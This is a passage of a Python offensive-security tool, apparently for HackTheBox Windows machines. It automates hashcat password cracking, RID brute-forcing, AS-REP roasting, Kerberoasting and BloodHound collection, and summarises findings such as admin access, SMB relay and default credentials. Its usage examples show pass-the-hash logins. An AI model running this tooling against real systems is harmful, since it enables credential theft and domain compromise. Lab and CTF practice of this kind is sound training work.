        for mode, description in hash_modes:
            self.print_status(f"Cracking {description} hashes (mode {mode})...", "info")
            
            cmd = ['hashcat', '-m', str(mode), hashes_file, wordlist,
                   '--force', '--quiet', '-o', cracked_file, '--outfile-format', '2',
                   '--runtime', '300']
            
            self.print_status(f"  Running hashcat (5 min max per mode)...", "info")
            code, stdout, stderr = self.run_command(cmd, timeout=330)
            
            if code in [0, 1]:  # 0 = cracked, 1 = exhausted
                # Get cracked results with --show
                show_cmd = ['hashcat', '-m', str(mode), hashes_file, '--show', '--quiet']
                code2, show_stdout, _ = self.run_command(show_cmd, timeout=30)
                
                if show_stdout.strip():
                    for line in show_stdout.strip().split('\n'):
                        if line.strip():
                            all_cracked.append(line.strip())
                            self.print_status(f"  CRACKED: {line.strip()}", "finding")
            elif code == -2:
                self.print_status("hashcat not found, skipping crack phase", "warning")
                return
            else:
                if self.verbose:
                    self.print_status(f"hashcat mode {mode} returned code {code}", "info")
        
        if all_cracked:
            self.print_status(f"Cracked {len(all_cracked)} hash(es)!", "finding")
            # Save all cracked results
            self.save_to_file('cracked.txt', '\n'.join(all_cracked) + '\n')
            self.print_status(f"Cracked hashes saved to {cracked_file}", "success")
        else:
            self.print_status("No hashes cracked with rockyou.txt", "info")
    
    # ==================== Concurrent Execution ====================
    
    def run_concurrent_enum(self):
        """Run ALL enumeration, attacks, and cracking concurrently"""
        
        # Build task list - everything runs in one pool
        all_tasks = {
            # Service enumeration
            'smb': self.enum_smb,
            'ldap': self.enum_ldap,
            'kerberos': self.enum_kerberos,
            'winrm': self.enum_winrm,
            'rdp': self.enum_rdp,
            'mssql': self.enum_mssql,
            'dns': self.enum_dns,
            'http': self.enum_http,
        }
        
        # RID brute (handles its own auth logic internally)
        if 445 in self.open_ports:
            all_tasks['rid_brute'] = self.rid_brute
        
        # Attack tasks
        if self.target.domain:
            all_tasks['asrep'] = self.asrep_roast
        
        if self.target.has_creds() and self.target.domain:
            all_tasks['kerberoast'] = self.kerberoast
            all_tasks['bloodhound'] = self.collect_bloodhound
        
        total = len(all_tasks)
        completed = [0]  # Mutable for thread-safe counter
        
        self.print_status(f"Launching {total} tasks concurrently...\n", "info")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(func): name for name, func in all_tasks.items()}
            
            for future in as_completed(futures):
                name = futures[future]
                completed[0] += 1
                try:
                    result = future.result()
                    if isinstance(result, ServiceResult):
                        self.results[name] = result
                    # RID brute returns a list, not ServiceResult
                    self.print_status(
                        f"[{completed[0]}/{total}] {name} ✓", "success")
                except Exception as e:
                    self.print_status(
                        f"[{completed[0]}/{total}] {name} ✗ {e}", "error")
                    if name != 'rid_brute':
                        self.results[name] = ServiceResult(service=name, port=0)
        
        # All tasks done - now crack any collected hashes
        self.crack_hashes()
    
    # ==================== Summary Report ====================
    
    def print_summary(self):
        """Print summary of findings"""
        self.print_header("ENUMERATION SUMMARY")
        
        print(f"\n{Colors.BOLD}Target:{Colors.END} {self.target.ip}")
        if self.target.domain:
            print(f"{Colors.BOLD}Domain:{Colors.END} {self.target.domain}")
        if self.target.has_creds():
            print(f"{Colors.BOLD}Credentials:{Colors.END} {self.target.cred_string()}")
        print(f"{Colors.BOLD}Output:{Colors.END} {self.output_dir}")
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}Open Services:{Colors.END}")
        for name, result in self.results.items():
            if result.open:
                status_parts = []
                if result.anonymous_access:
                    status_parts.append(f"{Colors.GREEN}ANON{Colors.END}")
                if result.guest_access:
                    status_parts.append(f"{Colors.YELLOW}GUEST{Colors.END}")
                if result.cred_access:
                    status_parts.append(f"{Colors.PURPLE}AUTH{Colors.END}")
                
                status = f" [{', '.join(status_parts)}]" if status_parts else ""
                svc_name = self.services.get(name, {}).get('name', name.upper())
                print(f"  • {svc_name:15} (port {result.port}){status}")
        
        findings = []
        
        if self.domain_users:
            findings.append(f"USERS: {len(self.domain_users)} domain users enumerated")
        
        for name, result in self.results.items():
            if name in ['smb', 'ldap', 'rpc'] and result.anonymous_access:
                findings.append(f"{name.upper()}: Anonymous/NULL access available")
            if result.guest_access:
                findings.append(f"{name.upper()}: Guest access available")
            if result.details.get('admin_access'):
                findings.append(f"{name.upper()}: ADMIN ACCESS!")
            if result.details.get('can_psremote'):
                findings.append(f"WINRM: Can get remote shell")
            if result.details.get('signing_required') == False:
                findings.append(f"SMB: Signing not required - relay possible")
            if result.details.get('zone_transfer'):
                findings.append(f"DNS: Zone transfer available")
            if result.details.get('default_creds'):
                findings.append(f"MSSQL: Default creds: {result.details['default_creds']}")
            if result.details.get('nla_required') == False:
                findings.append(f"RDP: NLA not required - check BlueKeep")
            if result.details.get('asrep_hashes'):
                findings.append(f"AS-REP: {len(result.details['asrep_hashes'])} roastable user(s)")
            if result.details.get('kerberoast_hashes'):
                findings.append(f"KERBEROAST: {len(result.details['kerberoast_hashes'])} service account(s)")
            if result.details.get('bloodhound_zip'):
                findings.append(f"BLOODHOUND: Data collected")
            if result.details.get('adcs_collected'):
                findings.append(f"ADCS: Certificate data collected")
            if result.details.get('ldapdump_dir'):
                findings.append(f"LDAP: Domain dumped to {result.details['ldapdump_dir']}")
        
        for auth_type in ['null', 'guest', 'cred']:
            shares_key = f'shares_{auth_type}'
            smb_result = self.results.get('smb', ServiceResult('smb', 445))
            if shares_key in smb_result.details:
                for share in smb_result.details[shares_key]:
                    if share.get('files'):
                        findings.append(f"SMB: Interesting files found in {share['name']}")
                        break
        
        if findings:
            print(f"\n{Colors.BOLD}{Colors.PURPLE}Key Findings:{Colors.END}")
            for f in findings:
                print(f"  ★ {f}")
        
        print(f"\n{Colors.BOLD}{Colors.YELLOW}Collected Data:{Colors.END}")
        
        collected = []
        if os.path.exists(os.path.join(self.output_dir, 'domain_users.txt')):
            collected.append(f"domain_users.txt ({len(self.domain_users)} users)")
        if os.path.exists(os.path.join(self.output_dir, 'asrep_hashes.txt')):
            collected.append("asrep_hashes.txt (hashcat -m 18200)")
        if os.path.exists(os.path.join(self.output_dir, 'kerberoast_hashes.txt')):
            collected.append("kerberoast_hashes.txt (hashcat -m 13100)")
        if os.path.exists(os.path.join(self.output_dir, 'ldapdump')):
            collected.append("ldapdump/ (HTML domain dump)")
        if os.path.exists(os.path.join(self.output_dir, 'bloodhound')):
            collected.append("bloodhound/ (import to BH GUI)")
        if os.path.exists(os.path.join(self.output_dir, 'zone_transfer.txt')):
            collected.append("zone_transfer.txt (DNS records)")
        
        if collected:
            for c in collected:
                print(f"  → {self.output_dir}/{c}")
        else:
            print("  (none)")
        
        print()
    
    def export_json(self, filepath: str):
        """Export results to JSON"""
        export_data = {
            'target': {
                'ip': self.target.ip,
                'domain': self.target.domain,
                'username': self.target.username,
            },
            'domain_users': self.domain_users,
            'output_dir': self.output_dir,
            'results': {}
        }
        
        for name, result in self.results.items():
            export_data['results'][name] = {
                'port': result.port,
                'open': result.open,
                'anonymous_access': result.anonymous_access,
                'guest_access': result.guest_access,
                'cred_access': result.cred_access,
                'details': result.details,
            }
        
        with open(filepath, 'w') as f:
            json.dump(export_data, f, indent=2)
        
        self.print_status(f"Results exported to {filepath}", "success")
    
    # ==================== Main Entry Point ====================
    
    def run(self):
        """Run full enumeration"""
        print_banner()
        
        start_time = time.time()
        
        print(f"\n{Colors.BOLD}Target:{Colors.END} {self.target.ip}")
        if self.target.has_creds():
            print(f"{Colors.BOLD}Credentials:{Colors.END} {self.target.cred_string()}")
            if self.target.hash:
                print(f"{Colors.BOLD}Auth:{Colors.END} NTLM Hash")
        print(f"{Colors.BOLD}Threads:{Colors.END} {self.threads}")
        print(f"{Colors.BOLD}Output:{Colors.END} {self.output_dir}")
        print()
        
        self.scan_ports()
        
        if not self.open_ports:
            self.print_status("No open ports found. Exiting.", "error")
            return
        
        self.discover_domain()
        self.run_concurrent_enum()
        
        elapsed = time.time() - start_time
        self.print_summary()
        
        self.print_status(f"Enumeration completed in {elapsed:.1f} seconds", "success")


def main():
    parser = argparse.ArgumentParser(
        description='WinEnum - Windows HackTheBox Auto-Enumeration Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic scan without credentials
  %(prog)s 10.10.10.100
  
  # Scan with credentials
  %(prog)s 10.10.10.100 -u administrator -p Password123 -d MEGACORP
  
  # Scan with NTLM hash
  %(prog)s 10.10.10.100 -u administrator -H aad3b435:31d6cfe0... -d MEGACORP
        """
    )
    
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('-u', '--username', help='Username for authentication')
    parser.add_argument('-p', '--password', help='Password for authentication')
    parser.add_argument('-d', '--domain', help='Domain name (auto-discovered if not provided)')
    parser.add_argument('-H', '--hash', help='NTLM hash (LM:NT or just NT)')
    parser.add_argument('-t', '--timeout', type=int, default=15, help='Command timeout (default: 15)')
    parser.add_argument('-T', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('-o', '--output', help='Output directory (default: ./winenum)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--json', metavar='FILE', help='Export results to JSON file')
    
    args = parser.parse_args()
    
    if args.password and args.hash:
        parser.error("Cannot specify both password and hash")
    
    target = Target(
        ip=args.target,
        username=args.username,
        password=args.password,
        domain=args.domain,
        hash=args.hash
    )
    
    enumerator = WinEnum(
        target, 
        timeout=args.timeout, 
        verbose=args.verbose,
        threads=args.threads,
        output_dir=args.output
    )
    
    try:
        enumerator.run()
        
        if args.json:
            enumerator.export_json(args.json)
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.END}")
        sys.exit(1)


if __name__ == '__main__':
    main()
